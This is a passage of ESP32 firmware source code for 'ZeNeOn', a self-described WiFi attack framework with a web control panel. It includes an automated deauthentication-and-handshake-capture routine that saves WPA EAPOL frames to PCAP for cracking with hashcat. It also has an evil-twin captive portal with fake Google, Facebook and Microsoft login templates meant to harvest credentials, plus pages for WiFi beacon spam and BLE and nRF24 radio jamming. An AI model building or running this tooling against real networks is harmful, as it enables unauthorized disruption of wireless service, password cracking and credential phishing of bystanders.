#include "SPIFFS.h"
#include "esp_event.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <DNSServer.h>
#include <WebServer.h>
#include <WiFi.h>
#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "esp_bt_defs.h"
#include <SPI.h>
#include <RF24.h>

WebServer server(80);
DNSServer dnsServer;
const byte DNS_PORT = 53;

bool sniffing = false;
bool deauthing = false;
bool spamming = false;
bool evilTwinActive = false;
bool capturingHandshake = false;
bool btJamming = false;
unsigned long btJamEndTime = 0;
unsigned long btJamStartTime = 0;
unsigned long lastBtJam = 0;
uint32_t btJamPktsSent = 0;
bool nrfJamming = false;
unsigned long nrfJamEndTime = 0;
unsigned long lastNrfJam = 0;
uint32_t nrfJamPktsSent = 0;
bool nrfReady = false;
unsigned long deauthEndTime = 0;
unsigned long deauthStartTime = 0;
unsigned long lastDeauth = 0;
unsigned long lastSpam = 0;
uint16_t deauthSeq = 0;
int spamCount = 0;
uint32_t deauthPktsSent = 0;
uint32_t totalPacketsCaptured = 0;
uint8_t eapolFramesDetected = 0;

/* ============ AUTOMATED ATTACK PHASES ============ */
enum AttackPhase {
  PHASE_IDLE,
  PHASE_PRE_CAPTURE,  // Capture beacons/probes before deauth
  PHASE_DEAUTH_BURST, // Short deauth burst to disconnect clients
  PHASE_LISTEN,       // Listen for EAPOL (clients reconnecting)
  PHASE_DONE          // Complete - ready for download
};

AttackPhase currentPhase = PHASE_IDLE;
unsigned long phaseStartTime = 0;
unsigned long attackTotalDuration = 0;
unsigned long attackGlobalStart = 0;

// EAPOL handshake tracking (individual 4-way messages)
uint8_t eapolM1Count = 0;
uint8_t eapolM2Count = 0;
uint8_t eapolM3Count = 0;
uint8_t eapolM4Count = 0;
bool handshakeCaptured = false;
bool beaconCaptured = false;
uint16_t beaconCount = 0;
uint16_t authFrameCount = 0;
uint16_t assocFrameCount = 0;
uint8_t deauthCycles = 0;

// Phase timing (milliseconds)
const unsigned long PRE_CAPTURE_MS = 4000;  // 4s beacon capture
const unsigned long DEAUTH_BURST_MS = 4000; // 4s aggressive deauth burst
const unsigned long LISTEN_MS = 8000;       // 8s listen for handshake

File pcapFile;
String targetSSID = "";
uint8_t targetBSSID[6] = {0};
int targetChannel = 1;
uint8_t ownAPMAC[6] = {0};
String evilTwinSSID = "";
int credentialsCount = 0;
int portalTemplate = 0; // 0=Generic WiFi, 1=Google, 2=Facebook, 3=Microsoft

#define MAX_CLIENTS 32
uint8_t clientMACs[MAX_CLIENTS][6];
int clientCount = 0;

// Event log ring buffer for real-time UI terminal
#define EVENT_LOG_SIZE 40
String eventLog[EVENT_LOG_SIZE];
int eventLogHead = 0;
int eventLogCount = 0;
unsigned long eventLogId = 0;

void addEvent(String msg) {
  unsigned long sec = millis() / 1000;
  String ts =
      String(sec / 60) + ":" + (sec % 60 < 10 ? "0" : "") + String(sec % 60);
  eventLog[eventLogHead] = "[" + ts + "] " + msg;
  eventLogHead = (eventLogHead + 1) % EVENT_LOG_SIZE;
  if (eventLogCount < EVENT_LOG_SIZE)
    eventLogCount++;
  eventLogId++;
}

struct pcap_hdr_t {
  uint32_t magic_number = 0xa1b2c3d4;
  uint16_t version_major = 2;
  uint16_t version_minor = 4;
  int32_t thiszone = 0;
  uint32_t sigfigs = 0;
  uint32_t snaplen = 65535;
  uint32_t network = 105;
};

struct pcaprec_hdr_t {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

typedef struct {
  uint16_t frame_ctrl;
  uint16_t duration;
  uint8_t addr1[6];
  uint8_t addr2[6];
  uint8_t addr3[6];
  uint16_t seq_ctrl;
} __attribute__((packed)) wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} __attribute__((packed)) wifi_ieee80211_packet_t;

typedef struct {
  uint8_t llc_header[8];
  uint8_t version;
  uint8_t type;
  uint16_t length;
} __attribute__((packed)) eapol_packet_t;

typedef struct {
  uint8_t descriptor_type;
  uint16_t key_info;
  uint16_t key_length;
  uint64_t replay_counter;
  uint8_t nonce[32];
  uint8_t iv[16];
  uint8_t rsc[8];
  uint8_t id[8];
  uint8_t mic[16];
  uint16_t data_length;
} __attribute__((packed)) eapol_key_packet_t;

void parseMac(String mac, uint8_t *out) {
  sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &out[0], &out[1],
         &out[2], &out[3], &out[4], &out[5]);
}

bool isBroadcast(const uint8_t *mac) {
  return (mac[0] == 0xFF && mac[1] == 0xFF && mac[2] == 0xFF &&
          mac[3] == 0xFF && mac[4] == 0xFF && mac[5] == 0xFF);
}

bool macEquals(const uint8_t *a, const uint8_t *b) {
  return memcmp(a, b, 6) == 0;
}

bool isClientKnown(const uint8_t *mac) {
  for (int i = 0; i < clientCount; i++) {
    if (macEquals(clientMACs[i], mac))
      return true;
  }
  return false;
}

void addClient(const uint8_t *mac) {
  if (clientCount >= MAX_CLIENTS)
    return;
  if (isBroadcast(mac))
    return;
  if (mac[0] == 0 && mac[1] == 0 && mac[2] == 0)
    return;
  if (macEquals(mac, targetBSSID))
    return;
  if (isClientKnown(mac))
    return;
  memcpy(clientMACs[clientCount], mac, 6);
  clientCount++;
  Serial.printf("New client: %02X:%02X:%02X:%02X:%02X:%02X (total: %d)\n",
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5], clientCount);
}

/* ============ HACKER UI ============ */
String header() {
  return R"rawliteral(
<!DOCTYPE html><html><head>
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta charset="UTF-8">
<title>ZeNeOn</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#05080f;color:#00d4ff;font-family:'Courier New',monospace;min-height:100vh;padding-bottom:70px;overflow-x:hidden}
.top{padding:20px;text-align:center;background:#080c18;border-bottom:2px solid #0066ff;position:sticky;top:0;z-index:100;border-radius:0 0 12px 12px}
.top h1{font-size:26px;color:#00d4ff;letter-spacing:3px}
.top h1::before{content:'> '}
.sub{font-size:11px;opacity:0.6;margin-top:6px;letter-spacing:2px;color:#5599cc}
.container{max-width:800px;margin:0 auto;padding:16px;position:relative;z-index:3}
.card{background:#080e1e;border:1px solid rgba(0,100,255,0.4);padding:18px;margin-bottom:14px;border-radius:12px}
.card h3{color:#00d4ff;margin-bottom:10px;font-size:16px;letter-spacing:2px;text-transform:uppercase;padding-left:16px}
button{width:100%;padding:12px 18px;margin-top:8px;background:rgba(0,30,60,0.7);color:#00d4ff;border:1px solid #0066ff;font-size:14px;font-weight:600;cursor:pointer;font-family:'Courier New',monospace;letter-spacing:1px;text-transform:uppercase;border-radius:8px}
button:disabled{opacity:0.4;cursor:not-allowed}
button:not(:disabled):hover{background:rgba(0,50,100,0.8);color:#fff}
button.danger{background:rgba(30,5,10,0.7);border-color:#ff0040;color:#ff0040}
button.danger:not(:disabled):hover{background:rgba(50,5,15,0.8);color:#fff}
button.secondary{background:rgba(5,15,30,0.7);border-color:#0055cc;color:#55aaff}
button.secondary:not(:disabled):hover{background:rgba(10,30,60,0.8);color:#00d4ff}
button.success{background:rgba(0,30,10,0.7);border-color:#00ff88;color:#00ff88}
button.success:not(:disabled):hover{background:rgba(0,50,20,0.8);color:#fff}
input,select{width:100%;padding:12px;margin-top:8px;background:#050a14;color:#00d4ff;border:1px solid rgba(0,100,255,0.4);font-size:14px;font-family:'Courier New',monospace;border-radius:8px}
input:focus,select:focus{outline:none;border-color:#00d4ff}
input::placeholder{color:rgba(0,160,255,0.35)}
.net-item{background:rgba(8,14,28,0.6);border:1px solid rgba(0,100,255,0.3);padding:12px;margin-top:8px;cursor:pointer;border-radius:8px;border-left:3px solid transparent}
.net-item:hover{background:rgba(10,25,50,0.7);border-left-color:#0088ff}
.net-item.selected{background:rgba(10,30,60,0.8);border-color:#00d4ff;border-left-color:#00d4ff}
.net-name{font-weight:600;font-size:14px;margin-bottom:3px;color:#00d4ff}
.net-details{font-size:12px;color:#5599cc;opacity:0.9}
.status{padding:10px 14px;background:rgba(5,15,30,0.6);border-left:4px solid #0088ff;margin:10px 0;font-size:13px;color:#00d4ff;border-radius:0 8px 8px 0}
.status.warning{background:rgba(30,20,0,0.6);border-left-color:#ffaa00;color:#ffaa00}
.status.warning::before{content:'\u26a0 '}
.status.error{background:rgba(25,5,10,0.6);border-left-color:#ff0040;color:#ff0040}
.status.error::before{content:'\u2716 '}
.status.success{background:rgba(0,25,10,0.6);border-left-color:#00ff88;color:#00ff88}
.status.success::before{content:'\u2714 '}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
.hidden{display:none}
.eapol-grid{display:grid;grid-template-columns:1fr 1fr 1fr 1fr;gap:6px;margin:10px 0}
.eapol-box{text-align:center;padding:10px 6px;border-radius:6px;border:1px solid rgba(0,100,255,0.3);background:rgba(5,10,20,0.6)}
.eapol-box.captured{border-color:#00ff88;background:rgba(0,40,20,0.6)}
.eapol-box .label{font-size:11px;opacity:0.6;margin-bottom:4px}
.eapol-box .count{font-size:18px;font-weight:bold}
.eapol-box.captured .count{color:#00ff88}
.phase-bar{background:rgba(5,10,20,0.8);border:1px solid rgba(0,100,255,0.3);border-radius:8px;padding:12px;margin:10px 0}
.phase-steps{display:flex;justify-content:space-between;margin-bottom:8px}
.phase-step{text-align:center;flex:1;padding:6px 4px;font-size:11px;opacity:0.4;border-bottom:2px solid rgba(0,100,255,0.2)}
.phase-step.active{opacity:1;border-bottom-color:#ffaa00;color:#ffaa00}
.phase-step.done{opacity:0.8;border-bottom-color:#00ff88;color:#00ff88}
.progress-outer{background:rgba(0,30,60,0.5);border-radius:4px;height:6px;overflow:hidden;margin-top:6px}
.progress-inner{height:100%;background:#0088ff;border-radius:4px;width:0%}
.capture-quality{display:flex;gap:8px;margin:10px 0;flex-wrap:wrap}
.cq-item{flex:1;min-width:80px;text-align:center;padding:8px;border-radius:6px;border:1px solid rgba(0,100,255,0.2);background:rgba(5,10,20,0.5)}
.cq-item .cq-val{font-size:16px;font-weight:bold;margin-bottom:2px}
.cq-item .cq-lbl{font-size:10px;opacity:0.6}
.footer{position:fixed;bottom:0;left:0;right:0;text-align:center;padding:10px;background:#080c18;border-top:1px solid rgba(0,100,255,0.3);font-size:11px;color:#5599cc;z-index:100;letter-spacing:1px}
.footer a{color:#00d4ff;text-decoration:none}
.footer a:hover{color:#fff}
@media(max-width:600px){.grid{grid-template-columns:1fr}.eapol-grid{grid-template-columns:1fr 1fr}}
</style></head><body>
<div class="top"><h1>ZeNeOn</h1><div class="sub">ESP32 WiFi Security Framework v5.1</div></div>
<div class="container">
)rawliteral";
}

String homeUI() {
  return header() + R"rawliteral(
<div class="card">
<h3>Select Attack</h3>
<button onclick="location.href='/deauth'">Deauth Attack</button>
<button class="secondary" onclick="location.href='/evilui'">Evil Twin Attack</button>
<button class="secondary" onclick="location.href='/spamui'">WiFi Spam</button>
<button class="secondary" onclick="location.href='/btjamui'">BLE Jammer</button>
<button class="secondary" onclick="location.href='/nrfjamui'">BT Jammer (nRF24)</button>
</div>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
</div></body></html>
)rawliteral";
}

/* ============ DEAUTH + HANDSHAKE CAPTURE UI ============ */
String deauthUI() {
  String h = header() + R"rawliteral(
<div class="card">
<h3>Step 1: Select Target</h3>
<div id="status" class="status hidden"></div>
<div id="networks"><div class="status">Scanning networks...</div>
</div>
<button class="secondary" style="margin-top:15px" id="rescanBtn" onclick="rescanNetworks()">⟳ Rescan Networks</button>
</div>

<div class="card hidden" id="timerCard">
<h3>Step 2: Auto Attack + Capture</h3>
<p style="margin-bottom:10px;opacity:0.7;font-size:12px">Select duration → Auto captures beacons → Deauths → Captures EAPOL handshake</p>
<div class="grid">
<button onclick="autoAttack(30)">30 Sec</button>
<button onclick="autoAttack(60)">60 Sec</button>
<button onclick="autoAttack(90)">90 Sec</button>
<button onclick="autoAttack(120)">120 Sec</button>
</div>
<div id="clientInfo" class="status hidden" style="margin-top:15px"></div>
</div>

<div class="card hidden" id="liveCard">
<h3>Live Capture Status</h3>
<div class="phase-bar" id="phaseBar">
<div class="phase-steps">
<div class="phase-step" id="ph1">1. Beacons</div>
<div class="phase-step" id="ph2">2. Deauth</div>
<div class="phase-step" id="ph3">3. Listen</div>
<div class="phase-step" id="ph4">4. Done</div>
</div>
<div class="progress-outer"><div class="progress-inner" id="progBar"></div></div>
<div style="text-align:center;margin-top:8px;font-size:12px;opacity:0.7" id="phaseText">Waiting...</div>
</div>

<div class="eapol-grid">
<div class="eapol-box" id="m1box"><div class="label">EAPOL M1</div><div class="count" id="m1">0</div></div>
<div class="eapol-box" id="m2box"><div class="label">EAPOL M2</div><div class="count" id="m2">0</div></div>
<div class="eapol-box" id="m3box"><div class="label">EAPOL M3</div><div class="count" id="m3">0</div></div>
<div class="eapol-box" id="m4box"><div class="label">EAPOL M4</div><div class="count" id="m4">0</div></div>
</div>

<div id="hsStatus" class="status" style="text-align:center">Waiting for EAPOL handshake...</div>

<div class="capture-quality">
<div class="cq-item"><div class="cq-val" id="cqPkts">0</div><div class="cq-lbl">Packets</div></div>
<div class="cq-item"><div class="cq-val" id="cqBeacon">✗</div><div class="cq-lbl">Beacons</div></div>
<div class="cq-item"><div class="cq-val" id="cqClients">0</div><div class="cq-lbl">Clients</div></div>
<div class="cq-item"><div class="cq-val" id="cqDeauth">0</div><div class="cq-lbl">Deauths</div></div>
</div>

<div style="margin-top:12px">
<h3 style="color:#00d4ff;font-size:14px;margin-bottom:8px;letter-spacing:2px">EAPOL 4-WAY HANDSHAKE TERMINAL</h3>
<div id="termWrap" style="background:#020408;border:1px solid rgba(0,100,255,0.4);border-radius:8px;padding:2px">
<div style="display:flex;align-items:center;padding:5px 10px;background:rgba(0,40,80,0.4);border-radius:6px 6px 0 0;border-bottom:1px solid rgba(0,100,255,0.2)">
<div style="width:7px;height:7px;border-radius:50%;background:#ff3b30;margin-right:5px"></div>
<div style="width:7px;height:7px;border-radius:50%;background:#ffcc00;margin-right:5px"></div>
<div style="width:7px;height:7px;border-radius:50%;background:#00ff88;margin-right:8px"></div>
<span style="font-size:11px;color:#5599cc;letter-spacing:1px">eapol_monitor</span>
<span id="termBlink" style="margin-left:auto;color:#00ff88;font-size:11px">&#9679;</span>
</div>
<div id="terminal" style="height:200px;overflow-y:auto;padding:8px 12px;font-size:12px;line-height:1.6;color:#00cc66;font-family:'Courier New',monospace"><span style='color:#5599cc'>Waiting for attack to start...</span>
</div></div></div>
</div>

<div class="card hidden" id="dlCard">
<h3>Download Capture</h3>
<div id="dlStatus" class="status"></div>
<button class="success" onclick="location.href='/download'" id="dlBtn">⬇ Download PCAP File</button>
</div>

<div class="card">
<h3>Manual Controls</h3>
<button class="secondary" onclick="manualSniff()" id="sniffBtn">📡 Manual Sniff Only</button>
<button class="danger" onclick="stopAll()">⬛ Stop All + Save</button>
</div>

<div id="reconnOverlay" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:9999;display:none;align-items:center;justify-content:center;flex-direction:column">
<div style="text-align:center;padding:30px">
<div style="font-size:22px;color:#ffaa00;margin-bottom:15px">⚡ Switching Channel...</div>
<div style="color:#5599cc;font-size:14px;margin-bottom:10px">AP is restarting on target channel.</div>
<div style="color:#00d4ff;font-size:13px">Auto-reconnecting<span id="reconDots">...</span></div>
<div style="margin-top:15px;color:#5599cc;font-size:12px">If not auto-reconnected, manually rejoin <strong>ZeNeOn</strong> WiFi</div>
</div></div>
<button class="secondary" onclick="location.href='/'">← Back to Home</button>
<script>
let targetSSID='',selectedId=-1,clientPoll=null,statusPoll=null,attackActive=false,lastLogId=0,logPoll=null;
var retryFetch=function(url,opts,retries,delay_ms){
  retries=retries||8;delay_ms=delay_ms||1500;
  return fetch(url,opts).catch(function(e){
    if(retries<=0) throw e;
    return new Promise(function(r){setTimeout(r,delay_ms);}).then(function(){return retryFetch(url,opts,retries-1,delay_ms);});
  });
}
var showReconnOverlay=function(){
  let o=document.getElementById('reconnOverlay');
  o.style.display='flex';
  let dots=0;
  let iv=setInterval(function(){
    dots=(dots+1)%4;
    document.getElementById('reconDots').textContent='.'.repeat(dots+1);
  },400);
var checkConn=function(){
    fetch('/clients',{signal:AbortSignal.timeout(2000)}).then(function(){
      o.style.display='none';clearInterval(iv);
    }).catch(function(){setTimeout(checkConn,1500);});
  }
  setTimeout(checkConn,2000);
}
var rescanNetworks=function(){
  let btn=document.getElementById('rescanBtn');
  btn.disabled=true;btn.textContent='⟳ Scanning...';
  fetch('/scan').then(r=>r.json()).then(nets=>{
    let c=document.getElementById('networks');
    c.innerHTML='';
    if(nets.length===0){c.innerHTML="<div class='status error'>No networks found. Try again.</div>";}
    else{
      nets.forEach(function(n,i){
        let d=document.createElement('div');
        d.className='net-item';d.id='net'+i;
        d.innerHTML="<div><div class='net-name'>"+n.ssid+"</div><div class='net-details'>CH "+n.ch+" | RSSI "+n.rssi+" dBm | "+n.bssid+"</div></div>";
        d.onclick=function(){selectTarget(i,n.ssid,n.bssid,n.ch);};
        c.appendChild(d);
      });
    }
    btn.disabled=false;btn.textContent='⟳ Rescan Networks';
    selectedId=-1;targetSSID='';
    document.getElementById('timerCard').classList.add('hidden');
  }).catch(function(){
    btn.disabled=false;btn.textContent='⟳ Rescan Networks';
  });
}

// Auto-scan on page load
window.addEventListener('load',function(){rescanNetworks();});
var selectTarget=function(id,s,b,c){
  if(selectedId>=0){var prev=document.getElementById('net'+selectedId);if(prev)prev.classList.remove('selected');}
  selectedId=id;
  document.getElementById('net'+id).classList.add('selected');
  fetch('/target?ssid='+encodeURIComponent(s)+'&bssid='+b+'&ch='+c)
  .then(r=>r.text()).then(d=>{
    targetSSID=s;
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='⚡ Target Locked: '+s+' (CH '+c+')<br>Scanning for clients...';
    document.getElementById('timerCard').classList.remove('hidden');
    if(clientPoll) clearInterval(clientPoll);
    clientPoll=setInterval(function(){
      fetch('/clients').then(r=>r.text()).then(d=>{
        if(d!='0'){
          document.getElementById('clientInfo').classList.remove('hidden');
          document.getElementById('clientInfo').innerHTML='Found '+d+' clients (targeted deauth enabled)';
        }
      });
    },2000);
  });
}
var autoAttack=function(t){
  if(!targetSSID){
    document.getElementById('status').className='status warning';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Select a target first!';
    return;
  }
  if(clientPoll) clearInterval(clientPoll);
  attackActive=true;
  document.getElementById('liveCard').classList.remove('hidden');
  clearTerminal();
  addTermLine('☢ Auto attack started on '+targetSSID+' ('+t+'s)','#ffaa00');

  fetch('/autoattack?time='+t).then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').innerHTML='☢ Auto Attack Started on '+targetSSID+' ('+t+'s)';
    showReconnOverlay();
    setTimeout(function(){startStatusPoll(t);startLogPoll();},3000);
  });
}
var clearTerminal=function(){
  document.getElementById('terminal').innerHTML='';
}
var addTermLine=function(msg,color){
  let term=document.getElementById('terminal');
  let line=document.createElement('div');
  if(color) line.style.color=color;
  line.textContent=msg;
  term.appendChild(line);
  term.scrollTop=term.scrollHeight;
}
var startLogPoll=function(){
  if(logPoll) clearInterval(logPoll);
  lastLogId=0;
  logPoll=setInterval(function(){
    retryFetch('/eventlog?since='+lastLogId,{},3,1000).then(r=>r.json()).then(d=>{
      if(d.id) lastLogId=d.id;
      if(d.logs && d.logs.length>0){
        d.logs.forEach(function(l){
          let c='#00cc66';
          if(l.indexOf('EAPOL')>=0||l.indexOf('★')>=0) c='#00ffaa';
          if(l.indexOf('HANDSHAKE')>=0) c='#00ff88';
          if(l.indexOf('PHASE')>=0||l.indexOf('Deauth')>=0) c='#ffaa00';
          if(l.indexOf('BEACON')>=0) c='#5599cc';
          if(l.indexOf('ERROR')>=0||l.indexOf('WARN')>=0) c='#ff4444';
          addTermLine(l,c);
        });
      }
    }).catch(function(){});
  },800);
}
var startStatusPoll=function(totalTime){
  if(statusPoll) clearInterval(statusPoll);
  let startT=Date.now();
  statusPoll=setInterval(function(){
    retryFetch('/capturestatus',{},3,1000).then(r=>r.json()).then(d=>{
      document.getElementById('m1').textContent=d.m1;
      document.getElementById('m2').textContent=d.m2;
      document.getElementById('m3').textContent=d.m3;
      document.getElementById('m4').textContent=d.m4;
      if(d.m1>0) document.getElementById('m1box').classList.add('captured');
      if(d.m2>0) document.getElementById('m2box').classList.add('captured');
      if(d.m3>0) document.getElementById('m3box').classList.add('captured');
      if(d.m4>0) document.getElementById('m4box').classList.add('captured');

      document.getElementById('cqPkts').textContent=d.packets;
      document.getElementById('cqBeacon').textContent=d.beacons?'✓':'✗';
      document.getElementById('cqBeacon').style.color=d.beacons?'#00ff88':'#ff4444';
      document.getElementById('cqClients').textContent=d.clients;
      document.getElementById('cqDeauth').textContent=d.deauthPkts;

      let hs=document.getElementById('hsStatus');
      if(d.handshake){
        hs.className='status success';
        hs.innerHTML='✓ HANDSHAKE CAPTURED! (M1+M2 pair found) — Ready for hashcat';
      } else if(d.eapol>0){
        hs.className='status warning';
        hs.innerHTML='⚡ '+d.eapol+' EAPOL frames detected — Waiting for complete handshake...';
      } else {
        hs.className='status';
        hs.innerHTML='Listening for EAPOL handshake...';
      }

      let phases=['ph1','ph2','ph3','ph4'];
      phases.forEach(p=>{document.getElementById(p).className='phase-step'});
      let pt=document.getElementById('phaseText');
      if(d.phase=='PRE_CAPTURE'){
        document.getElementById('ph1').classList.add('active');
        pt.textContent='Capturing beacons from '+targetSSID+'... ('+d.beaconCount+' beacons)';
      } else if(d.phase=='DEAUTH_BURST'){
        document.getElementById('ph1').classList.add('done');
        document.getElementById('ph2').classList.add('active');
        pt.textContent='Deauth burst #'+d.cycles+' — '+d.deauthPkts+' packets sent';
      } else if(d.phase=='LISTEN'){
        document.getElementById('ph1').classList.add('done');
        document.getElementById('ph2').classList.add('done');
        document.getElementById('ph3').classList.add('active');
        pt.textContent='Listening for handshake... (cycle #'+d.cycles+')';
      } else if(d.phase=='DONE'){
        phases.forEach(p=>{document.getElementById(p).classList.add('done')});
        pt.textContent='Capture complete!';
        clearInterval(statusPoll);clearInterval(logPoll);
        attackActive=false;
        showDownload(d);
      } else if(d.phase=='IDLE' && attackActive){
        phases.forEach(p=>{document.getElementById(p).classList.add('done')});
        pt.textContent='Capture complete!';
        clearInterval(statusPoll);clearInterval(logPoll);
        attackActive=false;
        showDownload(d);
      }

      let elapsed=(Date.now()-startT)/1000;
      let pct=Math.min(100,Math.round((elapsed/totalTime)*100));
      document.getElementById('progBar').style.width=pct+'%';
    }).catch(e=>{});
  },800);
}
var showDownload=function(d){
  let dlCard=document.getElementById('dlCard');
  dlCard.classList.remove('hidden');
  let quality='';
  if(d.handshake) quality='<span style="color:#00ff88">★ EXCELLENT — Full handshake captured. Ready for hashcat/hcxpcapngtool.</span>';
  else if(d.eapol>0) quality='<span style="color:#ffaa00">◆ PARTIAL — Some EAPOL frames captured. May work with hashcat.</span>';
  else quality='<span style="color:#ff4444">✗ NO HANDSHAKE — No EAPOL captured. Try again with longer duration or move closer.</span>';
  document.getElementById('dlStatus').innerHTML='Packets: '+d.packets+' | Beacons: '+(d.beacons?'Yes':'No')+' | EAPOL: '+d.eapol+'<br>'+quality;
  document.getElementById('status').className='status '+(d.handshake?'success':'warning');
  document.getElementById('status').innerHTML=d.handshake?'✓ Attack complete — Handshake captured!':'⚠ Attack complete — '+d.eapol+' EAPOL frames';
  addTermLine(d.handshake?'★ ATTACK COMPLETE — HANDSHAKE CAPTURED!':'⚠ ATTACK COMPLETE — '+d.eapol+' EAPOL frames',d.handshake?'#00ff88':'#ffaa00');
}
var manualSniff=function(){
  fetch('/sniff').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='📡 Manual packet capture started on target channel';
    document.getElementById('sniffBtn').disabled=true;
    document.getElementById('liveCard').classList.remove('hidden');
    clearTerminal();
    addTermLine('📡 Manual capture started','#00d4ff');
    startStatusPoll(9999);
    startLogPoll();
  });
}
var stopAll=function(){
  if(clientPoll) clearInterval(clientPoll);
  if(statusPoll) clearInterval(statusPoll);
  if(logPoll) clearInterval(logPoll);
  attackActive=false;
  fetch('/stop').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='All operations stopped. PCAP saved.';
    document.getElementById('sniffBtn').disabled=false;
    addTermLine('⬛ All operations stopped. PCAP saved.','#ff4444');
    fetch('/capturestatus').then(r=>r.json()).then(d=>{
      if(d.packets>0) showDownload(d);
    }).catch(e=>{});
  });
}
</script>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
</div></body></html>
)rawliteral";
  return h;
}

String evilUI() {
  return header() + R"rawliteral(
<div class="card">
<h3>Evil Twin Attack</h3>
<p style="margin-bottom:12px;opacity:0.7">Create a fake AP with captive portal to harvest credentials</p>
<input id="s" placeholder="Enter target SSID name" value="">
<select id="tpl" style="margin-top:8px">
<option value="0">Generic WiFi Login</option>
<option value="1">Google Sign-In</option>
<option value="2">Facebook Login</option>
<option value="3">Microsoft Account</option>
</select>
<button onclick="startEvil()">Launch Evil Twin</button>
<button class="danger" onclick="stopEvil()">Stop Evil Twin</button>
<button class="secondary" onclick="getCreds()">Download Credentials</button>
<div id="status" class="status hidden"></div>
<div id="credCount" class="status hidden" style="margin-top:10px"></div>
</div>
<button class="secondary" onclick="location.href='/'">&#8592; Back to Home</button>
<script>
let credPoll=null;
var startEvil=function(){
  let ssid=document.getElementById('s').value;
  let tpl=document.getElementById('tpl').value;
  if(!ssid){
    document.getElementById('status').className='status warning';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Enter an SSID name';
    return;
  }
  fetch('/evil?ssid='+encodeURIComponent(ssid)+'&tpl='+tpl)
  .then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status warning';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='<strong>Evil Twin Active!</strong><br>Template: '+document.getElementById('tpl').selectedOptions[0].text+'<br><strong>Reconnect to "'+ssid+'" now!</strong>';
    pollCreds();
  });
}
var stopEvil=function(){
  if(credPoll) clearInterval(credPoll);
  fetch('/stopevil').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Evil Twin stopped. ZeNeOn restored.';
    document.getElementById('credCount').classList.add('hidden');
  });
}
var getCreds=function(){ window.location.href='/getcreds'; }
var pollCreds=function(){
  credPoll=setInterval(function(){
    fetch('/credstats').then(r=>r.text()).then(d=>{
      if(d!='0'){
        document.getElementById('credCount').classList.remove('hidden');
        document.getElementById('credCount').innerHTML='<strong>'+d+' credentials captured!</strong> Click Download.';
      }
    });
  },3000);
}
</script>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
</div></body></html>
)rawliteral";
}

String spamUI() {
  return header() + R"rawliteral(
<div class="card">
<h3>WiFi Spam</h3>
<p style="margin-bottom:15px;opacity:0.7">Flood the area with fake WiFi networks</p>
<div id="status" class="status hidden"></div>
<div class="grid">
<button onclick="startSpam(10)">10 Networks</button>
<button onclick="startSpam(20)">20 Networks</button>
<button onclick="startSpam(30)">30 Networks</button>
<button onclick="startSpam(50)">50 Networks</button>
</div>
<button class="danger" style="margin-top:15px" onclick="stopSpam()">⬛ Stop Spam</button>
</div>
<button class="secondary" onclick="location.href='/'">← Back to Home</button>
<script>
var startSpam=function(c){
  fetch('/spam?count='+c).then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Spamming '+c+' fake networks...';
  });
}
var stopSpam=function(){
  fetch('/stop').then(r=>r.text()).then(d=>{
    document.getElementById('status').className='status';
    document.getElementById('status').classList.remove('hidden');
    document.getElementById('status').innerHTML='Spam stopped';
  });
}
</script>
<div class="footer">Made by <a href="https://github.com/InoshMatheesha" target="_blank">MoOdY69</a> | ZeNeOn Framework v5.1</div>
</div></body></html>
)rawliteral";
}

/* ============ BLUETOOTH JAMMER UI ============ */
String btJamUI() {
  return header() + R"rawliteral(
<div class="card">
<h3>Bluetooth Jammer</h3>
<p style="margin-bottom:15px;opacity:0.7">Flood BLE advertisement channels with noise to disrupt nearby Bluetooth devices</p>
<div id="status" class="status hidden"></div>
<div class="grid">
<button onclick="startBtJam(15)">15 Sec</button>
<button onclick="startBtJam(30)">30 Sec</button>
<button onclick="startBtJam(60)">60 Sec</button>
<button onclick="startBtJam(120)">120 Sec</button>
</div>
<button class="danger" style="margin-top:15px" onclick="stopBtJam()">⬛ Stop Jammer</button>
<div id="liveCard" class="card hidden" style="margin-top:15px">
<h3>Jammer Status</h3>
<div class="capture-quality">
<div class="cq-item"><div class="cq-val" id="btPkts">0</div><div class="cq-lbl">Packets Sent</div></div>
<div class="cq-item"><div class="cq-val" id="btTime">0s</div><div class="cq-lbl">Elapsed</div></div>
<div class="cq-item"><div class="cq-val" id="btRemain">0s</div><div class="cq-lbl">Remaining</div></div>
</div>
<div class="progress-outer"><div class="progress-inner" id="btProg" style="width:0%"></div></div>
<div id="btLog" style="margin-top:10px;background:#020408;border:1px solid rgba(0,100,255,0.4);border-radius:8px;padding:10px;height:120px;overflow-y:auto;font-size:12px;color:#00cc66"></div>
</div>
</div>
